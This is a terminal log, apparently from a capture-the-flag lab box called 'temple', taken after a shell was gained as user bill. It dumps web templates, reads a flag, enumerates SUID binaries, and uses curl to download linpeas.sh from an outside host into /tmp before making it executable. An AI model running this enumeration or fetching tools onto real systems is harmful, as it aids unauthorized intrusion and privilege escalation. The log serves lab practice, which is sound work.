  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a href="/home">Home</a></li>
  <li><a href="/internal">Internal News</a></li>
  <li><a class="active" href="/external">External News</a></li>
  <li><a href="/account">Account</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>External news</h2>
  <h3>We work hard, but also play hard</h3>
  <p><br>Any cool news we should know about? Contact us!</p>
  <p>external@templeindustries.local</p>
</div>

</body>
</html>

bill@temple:~/webapp/templates$ cat home.html
cat home.html

{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a class="active" href="/home">Home</a></li>
  <li><a href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a href="/account">Account</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>Welcome!</h2>
  <h3>The main dashboard is still under development</h3>
  <p>Stay put for more features.</p>
  <p>Any features that we should implement? Contact our local developers!</p>
  <p>Make sure to read both the internal and external news on a daily basis.</p>
  <br>
  <p>Logged in from source {% if current_ip %} {{ current_ip }} {% endif %}</p>
  <p>Please contact our staff for support</p>
  <p>support@templeindustries.local</p>
</div>

</body>
</html>

{% endblock %}bill@temple:~/webapp/templates$ cat internal.html
cat internal.html

{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a href="/home">Home</a></li>
  <li><a class="active" href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a href="/account">Account</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>Internal news</h2>
  <br><h3>1. New features</h3>
  <p>As many of you may be aware of, we are still working on the application.<br>
  Please be patient, as new features will be implemented according to the business plan.</p><br>
  <h3>2. Developers</h3>
  <p>We are currently hiring new developers! Know someone who is skilled with:<br>
  - PHP (yes, we know, we know...)<br>
  - Pascal<br>
  - JavaScript<br>
  - Python<br>
  - Perl<br><br>
  Then please give us a tip at hiring@templeindustries.local. We are offering recruitment bonuses.</p><br>
  <p><br>Any cool news we should know about? Contact us!</p>
  <p>internal@templeindustries.local</p>
</div>

</body>
</html>

{% endblock %}

bill@temple:~$ cat flag1.txt
cat flag1.txt
7362bee1e78243f4811f26565137d5e20cbd9af0

bill@temple:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/11316/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11316/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11316/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11316/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/11316/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/11316/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11316/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/11316/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/11316/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/11316/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 20  2021 /snap/core/11316/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Jun  7  2021 /snap/core/11316/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Jun 15  2021 /snap/core/11316/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jul 23  2020 /snap/core/11316/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/11743/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11743/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11743/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11743/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/11743/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/11743/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11743/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/11743/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/11743/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/11743/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 20  2021 /snap/core/11743/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Jun  7  2021 /snap/core/11743/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Aug 27  2021 /snap/core/11743/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jul 23  2020 /snap/core/11743/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwSr--r-- 1 root   root            146K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root            116K Jun 15  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   telnetd          11K Nov  7  2016 /usr/lib/telnetlogin
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

bill@temple:/tmp$ curl http://10.8.19.103:80/linpeas.sh -o linpeas.sh
curl http://10.8.19.103:80/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  758k  100  758k    0     0   388k      0  0:00:01  0:00:01 --:--:--  387k
bill@temple:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
